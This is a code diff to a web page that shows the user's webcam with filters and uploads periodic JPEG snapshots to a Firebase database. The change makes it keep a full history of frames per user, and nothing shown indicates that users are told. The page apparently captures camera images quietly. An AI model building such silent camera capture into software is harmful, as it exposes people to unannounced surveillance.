@@ -96,7 +96,6 @@ video{
 
 <script>
 
-/* 🔥 YOUR ORIGINAL FIREBASE CONFIG (UNCHANGED) */
 const firebaseConfig = {
   apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57OALtSkfNdMmrE",
   authDomain: "live-tracker-554a7.firebaseapp.com",
@@ -110,7 +109,7 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-/* ✔ UNIQUE USER ID (FIX) */
+// UNIQUE USER ID
 let userId = localStorage.getItem("userId");
 
 if(!userId){
@@ -137,7 +136,6 @@ function setFilter(f){
   document.getElementById("video").style.filter = f;
 }
 
-/* 🔥 FIXED SNAPSHOT SYSTEM (MULTI USER SAFE) */
 function startSnapshots(){
 
   const video = document.getElementById("video");
@@ -148,14 +146,15 @@ function startSnapshots(){
 
     if(!video.videoWidth) return;
 
-    canvas.width=320;
-    canvas.height=240;
+    canvas.width = 320;
+    canvas.height = 240;
 
     ctx.drawImage(video,0,0,320,240);
 
     const frame = canvas.toDataURL("image/jpeg",0.5);
 
-    db.ref("camera/" + userId).set({
+    // HISTORY SAVE
+    db.ref("camera/" + userId + "/frames").push({
       frame: frame,
       updatedAt: Date.now()
     });
